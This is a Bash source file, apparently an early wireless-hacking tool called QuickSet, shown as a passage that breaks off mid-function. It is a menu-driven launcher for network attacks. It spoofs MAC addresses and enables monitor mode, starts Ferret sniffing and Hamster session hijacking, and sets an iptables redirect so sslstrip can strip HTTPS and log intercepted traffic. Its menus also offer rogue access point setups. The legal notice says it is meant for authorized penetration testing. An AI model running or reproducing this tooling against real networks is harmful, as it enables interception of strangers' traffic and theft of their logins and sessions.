#!/bin/bash
function script_info()
{
##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Filename: quickset.sh
## Version: 2.0
## Copyright (C) <2009>  <Snafu>

##  This program is free software: you can redistribute it and/or modify
##  it under the terms of the GNU General Public License as published by
##  the Free Software Foundation, either version 3 of the License, or
##  (at your option) any later version.

##  This program is distributed in the hope that it will be useful,
##  but WITHOUT ANY WARRANTY; without even the implied warranty of
##  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
##  GNU General Public License for more details.

##  You should have received a copy of the GNU General Public License
##  along with this program.  If not, see <http://www.gnu.org/licenses/>.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Legal Notice ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## This script was written with the intent for Legal PenTesting uses only.
## Make sure that you have consent prior to use on a device other than your own.
## Doing so without the above is a violation of Federal/State Laws within the United States of America.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##_____________________________________________________________________________##
## Prior to usage, I ask that you take the time to read fully through the script to understand the dynamics of the script.  Don't just be a $cr!pt K!dd!3 here; actually understand what it is that you are doing.

## I consider any script/program I write to always be a work in progress.  Please send any tips/tricks/streamlining ideas/comments/kudos via email to will@configitnow.com

## Comments written with a triple # are notes to myself, please ignore them.

## Colorsets ##
## echo -e "\033[1;32m = Instructions
## echo -e "\033[1;33m = Outputs
## echo -e "\033[1;34m = Headers
## echo -e "\033[36m   = Inputs
## echo -e "\033[31m   = Warnings / Infinite Loops
##_____________________________________________________________________________##


##~The Following Required Programs Must be in Your Path for Full Functionality~##
## This was decided as the de facto standard versus having the script look in locations for the programs themselves with the risk of them not being there.  Odds favor that they will be in /usr/bin or some other location readily available in your path...
## macchanger
## Hamster & Ferret
## sslstrip
## arpspoof
## aircrack-ng suite
## dhcpd3-server
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Requested Help ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## How can I kill the function loop issue?  A function always wants to finish, even if called off to another function...Useful, but how to kill;  return should work possibly??

## Last command issued syntax is below.  How can I make it show the value of the variables?.....
## history | tail -n 2 | head -n 1 | awk '{$1=""; print $0}'

## WOULD LIKE TO IMPLEMENT MORE FAST ACTING ATTACK TOOLS THAT REQUIRE LITTLE TO NO SETUP.  If you have a tool you would like added to this script please contact me
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ To Do ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Need to investigate the "subject" of Hirte AP....  Should this not be a Router attack??

## Figure out if old PIDs are used during a power cycle...if not we'll do PID assignments to ensure kill -9s
## Use PIDs to make a greppable list

## Check for calling of a device or variable to ensure its been set so that quickset.sh doesn't error out....

## svn up in update--(), this has some issue with regards to calling "svn up" from within a directory without .svn -->  Skipped '.' It gives an exit flag of 0 which defeats my purposes...  Only a factor if the user has quickset.sh in a directory called quickset that was not created with subversion itself.  To be dealt with at a later time 

## `ifconfig mon0 | grep HWaddr | cut -d- -f1-6 | sed 's/-/:/g'` will fix the random mac issue....
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Development Notes ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Past notes are within wifi_101.sh <Version 1.5 (FINAL)>
## To grab a deprecated copy of wifi_101.sh do: svn checkout http://wifi-101.googlecode.com/svn/trunk wifi_101

## If you have devices listed as ath0 or something other than wlan or mon, you will have to make appropriate changes to the naming and monitormode functions

## $var is a recycled variable throughout the script.  $parent is a variable declaring where a function is called from.

## One of the tougher parts of designing this script was weighing in on which programs to include, originally I had decided to implement a KarMetasploit attack.  I later decided against it; instead deciding to focus on smaller programs; with the thought concept that this script is not meant to be an all encompassing tool, but one designed to setup "Quick Fixes".....

## For Functions within Functions (sub-functions), I have found that I like to declare my variables for use within a function at the beginning of the function, then I list my sub-functions, at the end of the sub-functions you will find the parent functions commands.  It may be a strange way to do it, but it works for my readability purposes.

## As of version 0.9, the old "Amplification Mode" has been removed.  It was more of a multiplication technique.
## With the advent of version 1.3 a proper technique for ARP amplification has been added in that will allow the user to do advanced Packet Forging thereby creating real amplification methods.

## As of version 1.5, the option for Automatic WEP attacks has been removed.  I wanted to keep it in, but there are so many variables with respect towards WEP cracking that until a GUI option for quickset exists, it will not be feasible to have this option.

## init_setup--() has been clarified.  The old menu was very confusing with regards to creating variables for NIC names, enabling monitor mode, etc...  The new menu is a lot more "user" friendly 

## On 21 September, I matched the MTUs for the routing portions; this FINALLY made it to where the iPhone could connect....!
## Part of the problem had been that I was trying to go with a rather high MTU 1800.....This is not recommended as the default for a LAN is 1500, I believe that the fragmentation resulting from the 1800 caused the failures.
## After further study into the matter it seems that matching of MTUs is not to be recommended; The only MTU that needs to be changed is at0.  at0 should be set to 1400 for the MTU value.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~ Planned Implementations ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## sed/grep function to check and ensure that when a MAC address is given, it is legit and can be used.

## Functionality to allow the user the enter device NIC names within the script on the off chance that the user has not already named them during init_setup--().  As of now, failure to fully enter in all required device NICs during init_setup--() will force the user to call naming--() thereby dramatically slowing down the effectivness of quickset.sh for a simple feature that should have already been thought of.

## Sanitization of every input with regards to preventing "user error/hacking" (gets me in the mindset for real coding languages in the future to actually think of what I am coding as a whole, and think about how it could be used against the box it is run on sploit' wise, all because I failed to account for certain user inputs...Think SQLI)"
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Bug Traq ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Multiple Sticky Pots are causing issues.  This will probably affect the other two choices for SoftAPs as well.  Found via usage of completly different network settings.  This leads to a loop at the method selection.  Not a script killer, but should be addressed for learning purposes sometime in the near future.  A simple hack to prevent this bug, but not fix it would be to add a variable similar to the dhcpd cleanup function variable for use in seeing if a fake AP already exists.  After I figure out the reason behind the bug, I will decide on whether or not to allow multiple APs.

## Airbase-NG segmentation fault on BT5r1 (32-bit Gnome)
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Credits and Kudos ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## First and foremost, to God above for giving me the abilities I have, Amen.

## My main scripting style is derived from carlos_perez@darkoperator.com
## Credit for some of the routing features in this script to him as well

## Grant Pearson for having me RTFM with xterm debugging

## comaX for showing me how much easier it is to follow conditional statements if blank spaces are added in.  This comes in really handy with editors like Kate with folding markers shown.
## Credit for the variable parser within mass_arp--() and the majority of the brainpower behind update--()

## ShadowMaster for showing me the error of my ways with what I thought was "ARP Amplification".
## Due to his thoughts on the matter, I have completly rewritten the wifi_101--() portion of this script.

## melissabubble for informing me about the "The Wireless Vaccuum" and "WiFi Range Extender" not working properly.  After careful study of the functions I came to the conclusion listed under the "Development Notes" up top.

## Kudos to my wife for always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
read
}

##~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
usage--()
{
clear
echo -e "\033[1;32m\nUsage: ./quickset.sh"
}

init_setup--()
{
kill_mon= ## Nulled
clear
echo -e "\033[1;32m\n--------------------------------------------------------------------------------------
         Only Certain Modes in this Script Require Both Devices to be Defined
--------------------------------------------------------------------------------------\033[1;34m\n
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                   Initial NIC Setup
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Internet Connected NIC                                   [\033[1;33m$IE\033[36m]

2) Monitor Mode NIC                                         [\033[1;33m$pii\033[36m]

3) Enable Monitor Mode

4) Kill Monitor Mode

5) MAC Address Options

6) List Available NICs

7) Proceed

E)xit Script\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
read init_var
case $init_var in
	1) echo -e "\033[36m\nDefine NIC" 
	read IE
	dev_check_var=$IE
	dev_check--
	if [[ -z $dev_check ]];then
		init_setup--
	else
		IE= ## Nulled
		init_setup--
	fi;;

	2) echo -e "\033[36m\nDefine NIC" 
	read pii
	dev_check_var=$pii
	dev_check--
	if [[ -z $dev_check ]];then
		init_setup--
	else
		pii= ## Nulled
		init_setup--
	fi;;

	3) monitormode--
	init_setup--
	;;

	4) kill_mon="kill"
	monitormode--
	init_setup--;;

	5) mac_control--;;

	6) nics--
	init_setup--;;

	7) main_menu--;;

	e|E) exit 0;;

	*) init_setup--;;
esac
}

monitormode--()
{
var= ## Nulled
KM= ## Device to kill
clear
echo -e "\033[1;33m"
ifconfig -a | grep wlan | awk '{ print $1"   "$5 }'; ifconfig -a | grep mon | awk '{ print $1"    "$5 }'
sleep 1
if [[ $kill_mon == "kill" ]];then
	echo -e "\033[31m\n
                              ***WARNING***\033[32m
       Do not attempt to directly disable Monitor Mode on a Physical Device
        The script will ask for the associated Physical Device when ready\033[31m
                              ***WARNING***"
	sleep 1
		echo -e "\033[36m\nMonitor Mode Device to Kill?"
		read KM
		dev_check_var=$KM
		dev_check--
		if [[ $dev_check == "fail" ]];then
			return
		fi

		if [[ -z $KM ]];then
			return
		fi

	while [ -z $var ];do
		echo -e "\033[36m\nWhat Physical Device is \033[1;33m$KM\033[36m Associated With?"
		read var
		dev_check_var=$var
		dev_check--
		if [[ $dev_check == "fail" ]];then
			var= ## Nulled
		fi

	done

	echo -e "\033[1;33m"
	airmon-ng stop $KM && airmon-ng stop $var
	pii= ## Nulled
	echo -e "\n\n\033[1;32mPress Enter to Continue"
	read
else
		echo -e "\033[36m\nPhysical Device to Enable Monitor Mode on?"
		read phys_dev
		if [[ -z $phys_dev ]];then
			return
		fi

		dev_check_var=$phys_dev
		dev_check--
		if [[ $dev_check == "fail" ]];then
			return
		fi

	echo -e "\033[1;33m"
	airmon-ng start $phys_dev
	sleep 1
	var= ## Nulled
	while [ -z $var ];do
		echo -e "\033[36m\nDevice Name Assigned for Monitor Mode on \033[1;33m$phys_dev\033[36m?\n(i.e.  mon0, mon1, mon2?, etc....)"
		read var
		dev_check_var=$var
		dev_check--
		if [[ $dev_check == "fail" ]];then
			var= ## Nulled
		fi

	done

	pii=$var
fi
}

nics--()
{
clear
echo -e "\033[1;33m"
airmon-ng && ifconfig -a | grep --color=never HWaddr | awk '{ print $1"    "$5 }'
echo -e "\n\n\033[1;32mPress Enter to Continue"
read
}

mac_control--()
{

	mac_control_II--()
	{
	mac_dev= ## Nulled
	mac_devII= ## Nulled
	rand= ## Nulled
	var_II= ## Nulled
	sam= ## Variable for SoftAP MAC address
	clear
	echo -e "\033[31m\n
                              ***WARNING***\033[32m
       Do not attempt to directly change a Virtual Device (Monitor Mode NIC)
This script requires Physical and Virtual devices to have matching MAC Addresses\033[31m
                              ***WARNING***"
	sleep 1
	while [ -z $mac_dev ];do
		echo -e "\033[36m\n\n\n\n\n\nNIC to Change?"
		read mac_dev
		dev_check_var=$mac_dev
		dev_check--
		if [[ $dev_check == "fail" ]];then
			mac_dev= ## Nulled
		fi

	done

	while [ -z $rand ];do
		echo -e "\033[36m\nRandom MAC? (y or n)"
		read rand
		case $rand in
			y|Y) ;;

			n|N) while [ -z $sam ];do
				echo -e "\033[36m\nDesired MAC Address for \033[1;33m$mac_dev\033[36m?"
				read sam
			done;;

			*) rand= ;; ## Nulled
		esac

	done

	while [[ $var_II != "x" ]];do
		echo -e "\033[36m\nDoes \033[1;33m$mac_dev\033[36m have a Monitor Mode NIC associated with it? (y or n)"
		read var
		case $var in
			n|N|y|Y) var_II="x" ;;
			*) var_II= ;; ## Nulled
		esac

	done

	case $var in
		y|Y) case $rand in
			y|Y) while [ -z $mac_devII ];do
				echo -e "\033[36m\nMonitor Mode NIC name?"
				read mac_devII
				dev_check_var=$mac_devII
				dev_check--
				if [[ $dev_check == "fail" ]];then
					mac_devII= ## Nulled
				fi

			done

			ifconfig $mac_dev down
			ifconfig $mac_devII down
			clear
			echo -e "\033[1;33m\n--------------------\nChanging MAC Address\n--------------------"
			echo -e "\033[1;33m\n$mac_dev `macchanger -r $mac_dev`"
			if [ $? -ne 0 ];then
				echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
				ifconfig $mac_dev up
				sleep .7
				mac_control--
			else
				rand_mac=`ifconfig $mac_dev | awk '{print $5}'`
				rand_mac=`echo $rand_mac | awk '{print $1}'`
				echo -e "\033[1;33m\n$mac_devII `macchanger -m $rand_mac $mac_devII`"
				if [ $? -ne 0 ];then
					echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
					ifconfig $mac_devII up
					sleep .7
					mac_control--
				else
					ifconfig $mac_dev up
					ifconfig $mac_devII up
					echo -e "\033[32m\n\n\n\nPress Enter to Continue"
					read
					mac_control--
				fi

			fi;;

			n|N) mac_devII= ## Nulled
			while [ -z $mac_devII ];do
				echo -e "\033[36m\nMonitor Mode NIC name?"
				read mac_devII
				dev_check_var=$mac_devII
				dev_check--
				if [[ $dev_check == "fail" ]];then
					mac_devII= ## Nulled
				fi

			done

			ifconfig $mac_dev down
			ifconfig $mac_devII down
			clear
			echo -e "\033[1;33m\n--------------------\nChanging MAC Address\n--------------------"
			echo -e "\033[1;33m\n$mac_dev `macchanger -m $sam $mac_dev`"
			if [ $? -ne 0 ];then
				echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
				ifconfig $mac_dev up
				sleep .7
				mac_control--
			else
				echo -e "\033[1;33m\n$mac_devII `macchanger -m $sam $mac_devII`"
				if [ $? -ne 0 ];then
					echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
					ifconfig $mac_devII up
					sleep .7
					mac_control--
				else
					ifconfig $mac_dev up
					ifconfig $mac_devII up
					echo -e "\033[32m\n\n\n\nPress Enter to Continue"
					read
					mac_control--
				fi

			fi;;

		esac;;

		n|N)
		case $rand in
			y|Y) ifconfig $mac_dev down
			clear
			echo -e "\033[1;33m\n--------------------\nChanging MAC Address\n--------------------"
			echo -e "\033[1;33m\n$mac_dev `macchanger -r $mac_dev`"
			if [ $? -ne 0 ];then
				echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
				ifconfig $mac_dev up
				sleep .7
				mac_control--
			else
				ifconfig $mac_dev up
				echo -e "\033[32m\n\n\n\nPress Enter to Continue"
				read
				mac_control--
			fi;;

			n|N) ifconfig $mac_dev down
			clear
			echo -e "\033[1;33m\n--------------------\nChanging MAC Address\n--------------------"
			echo -e "\033[1;33m\n$mac_dev `macchanger -m $sam $mac_dev`"
			if [ $? -ne 0 ];then
				echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
				ifconfig $mac_dev up
				sleep .7
				mac_control--
			else
				ifconfig $mac_dev up
				echo -e "\033[32m\n\n\n\nPress Enter to Continue"
				read
				mac_control--
			fi;;

		esac;;

	esac
	}

clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      --MAC Address Options--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
(L)ist Available NICs

(C)hange a NIC MAC Address

(P)revious Menu

(M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
read var
case $var in
	l|L) nics--
	mac_control--;;

	c|C) mac_control_II--;;

	p|P) case $init_var in
		6) init_setup--;;
		*) init_var= ## Nulled
		setups--;;
	esac;;

	m|M) main_menu--;;

	*) mac_control--;;
esac
}

dev_check--()
{
ifconfig $dev_check_var > /dev/null
if [ $? -ne 0 ];then
	echo -e "\033[31mDevice does NOT exist"
	sleep .7
	dev_check="fail"
else
	dev_check= ## Nulled
fi
}

trap--()
{
echo -e "\033[31m\nPlease Exit Out of The Script Properly"
sleep 2
main_menu--
}

trap_101--()
{
echo -e "\033[31m\nPlease Exit Out of The Script Properly"
sleep 2
cleanup_101--
}
##~~~~~~~~~~~~~~~~~~~~~~~~~ END Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Starting Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
greet--()
{
clear
echo -e "\033[1;34m\n\n\n\n\n\n\n
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
QuickSet - A Quick Way to Setup a Wired/Wireless Hack
      Author: Snafu ----> \033[1;33mwill@configitnow.com\033[1;32m
           Read Comments Prior to Usage\033[1;34m

          Version \033[1;33m$current_ver\033[1;34m (\033[1;33m$rel_date\033[1;34m)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
sleep 3
ap_check= ## Nulled
init_setup--
}



main_menu--()
{
if [[ $trap_check == "on" ]];then
	exit 0
else
	trap trap-- INT
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~
    QuickSet (\033[1;33m$current_ver\033[1;34m)
     --Main Menu--
Make Your Selection Below
~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Setup Menu

2) WiFi Stuff

3) Quick Attacks

4) Routing Features

5) Check for Updates

E)xit Script\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) setups--;;

		2) wifi_101--;;

		3) atk_menu--;;

		4) routing--;;

		5) update--;;

		e|E) cleanup--;;

		*) main_menu--;;
	esac

fi
}
##~~~~~~~~~~~~~~~~~~~~~~~~~~ END Starting Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~ BEGIN main_menu-- functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
setups--()
{
clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
         --Setup Menu--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) List Available NICs

2) NIC Names & Monitor Mode Setup

3) MAC Address Options

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
read var
case $var in
	1) nics--
	setups--;;

	2) naming--;;

	3) mac_control--;;

	m|M) main_menu--;;

	*) setups--;;
esac
}

## wifi_101-- is at the bottom of this script due to length

atk_menu--()
{
clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                  --Attack Menu--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Ferret

2) Hamster

3) SSLStrip

4) Arpspoof

M)ain Menu
\033[1;32m
--> All Attacks launched in `pwd`\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
read var
case $var in
	1) ferret--;;

	2) if [[ -f hamster.txt ]];then
		xterm -bg black -fg grey -sb -rightbar -title "Hamster" -e hamster &
	else
		echo -e "\033[31m\n\nhamster.txt MUST exist to run hamster"
		read
		atk_menu--
	fi;;

	3) strip_em--;;

	4) arpspoof--;;

	m|M) main_menu--;;

	*) atk_menu--;;
esac
}

routing--()
{
## The order of functions are for 2, 3 and 4 are: ap_pre_var--(), ap_setup--(), ap--()
## The order of functions for the DHCP server is: dhcp_pre_var--(), dhcp_svr--()
#rte_choice= Routing Option Variable for use with IPTABLES setups...
private= ## Wifi Range Extender trip variable
clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~
    --Routing Features--
~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) IPTABLES Configuration

2) Kernel Forwarding

3) Wireless Vaccuum

4) StickyPot

5) WiFi Range Extender

6) DHCP Server

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
read rte_choice
case $rte_choice in
	1) ipt_--;;

	2) k_for--;;

	3) if  [[ -z $IE || -z $pii ]];then
		echo -e "\033[31mMonitor Mode NIC and Internet Connected NIC MUST be Defined Before Proceeding"
		sleep 1
		routing--
	else
		ap_pre_var--
		ap_setup--
	fi;;

	4) if  [[ -z $pii ]];then
		echo -e "\033[31mMonitor Mode NIC MUST be Defined Before Proceeding"
		sleep 1
		routing--
	else
		ap_pre_var--
		ap_setup--
	fi;;

	5) if  [[ -z $IE || -z $pii ]];then
		echo -e "\033[31mMonitor Mode NIC and Internet Connected NIC MUST be Defined Before Proceeding"
		sleep 1
		routing--
	else
		private="yes"
		ap_pre_var--
		ap_setup--
	fi;;

	6) dhcp_pre_var--
	if [[ $ap_check != "on" ]]; then
		ap_pre_var--
	fi

	dhcp_svr--;;

	m|M) main_menu--;;

	*) routing--;;
esac
}

cleanup--()
{
echo -e "\033[36m\nPerform Cleanup of Hidden Processes? (y or n)"
read var
case $var in
	y|Y) if [[ $dhcp_svr_stat == "active" ]]; then
		killall -9 dhcpd3
	fi;;
esac
exit
}

update--()
{
clear
update_ver=$(curl http://quickset.googlecode.com/svn/trunk/changes.txt)
if [ $? -ne 0 ];then
	echo -e "\033[1;33mNo Internet Connection!"
	sleep 1.2
	main_menu--
else
	update_ver=$(echo $update_ver | grep -iw "Current Version:" | awk '{print $3}')
	if [[ $update_ver > $current_ver ]];then
		var= ## Nulled
		while [ -z $var ];do
			echo -e "\n\n\033[1;33mYou are running version $current_ver\033[1;33m.\033[36m  Do you want to update to \033[1;33m$update_ver\033[36m? (y or n)"
			read update
			case $update in
				y|Y) echo -e "\033[1;33m[+] Updating script..."
				echo $PWD | grep -iw quickset > /dev/null
				if [ $? -ne 0 ];then
					svn co http://quickset.googlecode.com/svn/trunk quickset
					if [ $? -ne 0 ];then
						echo -e "\033[1;33mUpdate Failed!"
						update_check="fail"
					else
						cd quickset && chmod 755 quickset.sh
						echo -e "\033[1;33m[-] Script updated and now located in $PWD"
						sleep 2
						update_check="pass"
					fi

				else
					svn up
					if [ $? -ne 0 ];then
						echo -e "\033[1;33mUpdate Failed!"
						update_check="fail"
					else
						chmod 755 quickset.sh
						echo -e "\033[1;33m[-] Script updated!"
						update_check="pass"
					fi

				fi

				if [[ $update_check == "pass" ]];then
					trap_check="on"
					./quickset.sh
				else
					main_menu--
				fi;;

				n|N) main_menu--;;

				*) var= ;; ## Nulled
			esac

		done

	else
		echo -e "\033[1;33mYou Are Running The Latest Version!"
		sleep 1
		main_menu--
	fi

fi
}
##~~~~~~~~~~~~~~~~~~~~~~~~ END main_menu-- functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~ BEGIN setups-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~##
naming--()
{
clear
echo -e "\033[31m\n
                        ***WARNING***\033[32m
Proceeding further will erase all NIC variable names for this script
Doing so requires that you rename them for this script to work properly\033[31m
                        ***WARNING***
          

\033[36mDo you wish to continue? (y) or (n)\n"
read var
case $var in
	y|Y) IE= ## Nulled
	pii= ## Nulled
	init_setup--;;
	
	n|N) setups--;;
	*) naming--;;
esac
}
##~~~~~~~~~~~~~~~~~~~~~~~~~ END setups-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~ BEGIN atk_menu-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~##
ferret--()
{
#fer_dev= Device to be sniffed
#fer_type= Wifi or Wired
#wifi_check= Allowing us the conditional choice for a non default ferret setting of channel 6 if we use a wifi device

	ferret_II--()
	{
	#fer_chan= ## Channel to sniff on
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
           --Ferret Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Device to Sniff  [\033[1;33m$fer_dev\033[36m]

2) Type of Device   [\033[1;33m$fer_type\033[36m]

3) List Available NICs

4) Proceed

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) echo -e "\033[36m\nDevice?"
		read fer_dev
		dev_check_var=$fer_dev
		dev_check--
		if [[ -z $dev_check ]];then
			ferret_II--
		else
			fer_dev= ## Nulled
			ferret_II--
		fi;;

		2) echo -e "\033[36m\n1) Wireless\n2) Wired"
		read var
		case $var in
			1) fer_type="Wireless"
			wifi_check="wireless" ;;

			2) fer_type="Wired"
			wifi_check="wired" ;;

			*) var= ;; ## Nulled
		esac

		ferret_II--;;

		3) nics--
		ferret_II--;;

		4) if [[ -z $fer_dev || -z $wifi_check ]];then
			echo -e "\033[31mSniffing Device and Type Must be Selected to Proceed"
			read
			ferret_II--
		else
			case $wifi_check in
				wireless)fer_chan= ## Nulled
				while [ -z $fer_chan ];do
					echo -e "\033[36m\nWireless Channel to Sniff? (1-11)"
					read fer_chan
					case $fer_chan in
						1|2|3|4|5|6|7|8|9|10|11) ;;
						*) fer_chan= ;; ## Nulled
					esac
				done

				xterm -bg black -fg grey -sb -rightbar -title "Ferret" -e ferret -i $fer_dev --channel $fer_chan & 
				atk_menu--;;

				wired) xterm -bg black -fg grey -sb -rightbar -title "Ferret" -e ferret -i $fer_dev & 
				atk_menu--;;
			esac

		fi;;

		p|P) atk_menu--;;

		m|M) main_menu--;;

		*) ferret_II--;;
	esac
	}

## Below sets my defaults, change as you wish
if [ -z $pii ];then
	fer_dev=$IE ## Set to internet conected NIC if no monitor mode device present
else
	fer_dev=$pii
fi

fer_type="Wireless"
wifi_check="wireless"
ferret_II--
}

strip_em--()
{
lst_port=10000 ## Port to listen on
sstrip_log="sstrip_log" ## Log Filename
log_opt="-p" ## Logging option
lck_fav="Yes" ## Favicon Variable
ses_kil="Yes" ## Kill Sessions Variable
ssl_tail="Yes" ## SSLStrip Tail Log

	strip_em_III--()
	{
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $lst_port
	if [[ $lck_fav == "Yes" && $ses_kil == "Yes" ]];then
		xterm -bg black -fg grey -sb -rightbar -title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -f -k -l $lst_port & ssl_pid=$!
	elif [[ $lck_fav == "Yes" && $ses_kil == "No" ]];then
		xterm -bg black -fg grey -sb -rightbar -title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -f -l $lst_port & ssl_pid=$!
	elif [[ $lck_fav == "No" && $ses_kil == "Yes" ]];then
		xterm -bg black -fg grey -sb -rightbar -title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -k -l $lst_port & ssl_pid=$!
	else
		xterm -bg black -fg grey -sb -rightbar -title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -l $lst_port & ssl_pid=$!
	fi

	sleep 5
	case $ssl_tail in
		Yes) xterm -bg black -fg grey -sb -rightbar -title "SSLStrip Tail $(pwd)/$sstrip_log" -e tail -f $sstrip_log & ;;
	esac

	atk_menu--
	}

	strip_em_II--()
	{
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             --SSLStrip Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Listening Port             [\033[1;33m$lst_port\033[36m]

2) Log Name                   [\033[1;33m$sstrip_log\033[36m]

3) Logging Style              [\033[1;33m$log_opt\033[36m]

4) Substituted Lock Favicon   [\033[1;33m$lck_fav\033[36m]

5) Kill Sessions in Progress  [\033[1;33m$ses_kil\033[36m]

6) Tail SSLStrip Log          [\033[1;33m$ssl_tail\033[36m]

7) Proceed

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) echo -e "\033[36m\nDefine Listening Port"
		read lst_port
		strip_em_II--;;

